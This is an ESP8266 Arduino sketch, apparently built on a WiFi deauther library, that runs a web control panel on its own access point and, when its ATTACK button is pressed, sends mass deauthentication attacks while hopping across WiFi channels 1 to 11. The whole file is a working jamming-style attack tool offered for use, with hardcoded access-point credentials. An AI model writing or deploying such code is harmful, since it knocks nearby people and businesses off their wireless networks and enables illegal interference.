#include "Arduino.h"
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>

// SDK Headers - Pakai < > agar dibaca sebagai library global
#include <A_Config.h>
#include <Attack.h>
#include <Scan.h>

const char* apSSID = "GMpro";
const char* apPASS = "Sangkur87";
const int LED_PIN = 2;

AsyncWebServer server(80);
DNSServer dnsServer;
Attack attack;
Scan scanObj;

bool massDeauth = false;
int blinkInterval = 1000;
unsigned long lastHop = 0;
unsigned long prevBlink = 0;
int currentCh = 1;

const char INDEX_HTML[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#050505;color:#0f0;font-family:monospace;text-align:center;} .btn{background:#111;border:1px solid #0f0;color:#0f0;padding:10px;width:90%;margin:5px;}</style>
</head><body><h2>GMPRO87</h2><button class="btn" onclick="fetch('/scan')">SCAN</button><button class="btn" onclick="fetch('/cmd?type=mass&do=START')">ATTACK</button></body></html>)raw";

void setup() {
    Serial.begin(115200);
    pinMode(LED_PIN, OUTPUT);
    LittleFS.begin();
    scanObj.begin();
    attack.begin();

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(apSSID, apPASS, 1, 0); 
    dnsServer.start(53, "*", WiFi.softAPIP());

    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", INDEX_HTML);
    });

    // PERBAIKAN: Tambahkan [&] agar scanObj dan attack terbaca
    server.on("/scan", HTTP_GET, [&](AsyncWebServerRequest *request){
        scanObj.start(0);
        request->send(200, "text/plain", "Scanning...");
    });

    server.on("/cmd", HTTP_GET, [&](AsyncWebServerRequest *request){
        String type = request->getParam("type")->value();
        String action = request->getParam("do")->value();
        if(type == "mass") massDeauth = (action == "START");
        request->send(200, "text/plain", "OK");
    });

    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
    if (massDeauth) {
        if (millis() - lastHop >= 200) { 
            lastHop = millis();
            currentCh++; if (currentCh > 11) currentCh = 1;
            wifi_set_channel(currentCh);
            if (currentCh != 1) attack.start(true, false, false, false, 0); 
        }
    }
    if (millis() - prevBlink >= (unsigned long)blinkInterval) {
        prevBlink = millis();
        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    }
}
